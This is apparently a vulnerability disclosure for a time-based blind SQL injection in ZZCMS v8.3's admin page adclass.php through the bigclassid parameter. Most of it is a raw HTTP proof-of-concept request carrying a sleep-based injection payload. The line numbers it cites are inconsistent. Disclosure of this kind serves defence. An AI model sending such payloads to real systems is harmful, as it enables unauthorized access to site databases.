### ZZCMS V8.3 SQL injection in /admin/adclass.php line 48 via bigclassid parameter
## Vulnerability CMS and version
zzcms v8.3   Download link:http://www.zzcms.net/download/zzcms8.3.zip
## Triggering conditions
Log in to the CMS background access /admin/adclass.php page to trigger the vulnerability
## Vulnerability details
in CMS /admin/adclass.php line 264,bigclassid parameter value comes from $_REQUEST function that can bypass cms security filtering.
The value of the id parameter is finally brought to line 271 [/admin/adclass.php], and the final SQL statement is executed, resulting in SQL injection.
![](https://github.com/seedis/zzcms/blob/master/image/111.png)
## POC
```
POST /admin/adclass.php?dowhat=addsmallclass HTTP/1.1
Host: 192.168.30.216
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.30.216/admin/adclass.php?dowhat=addsmallclass&bigclassid=13%23
Content-Type: application/x-www-form-urlencoded
Content-Length: 125
Cookie: bdshare_firstime=1537240796511; PHPSESSID=gdfrssod38corqta0eho4shcs4; UserName=test; PassWord=a3f1308bd904cf33127380012be39839
Connection: close
Upgrade-Insecure-Requests: 1

bigclassid=%E9%A6%96%E9%A1%B5'and (select* from(select sleep(5))b)%23&classname%5B%5D=test&action=add&add2=%E6%8F%90%E4%BA%A4
```
![](https://github.com/seedis/zzcms/blob/master/image/222.png)
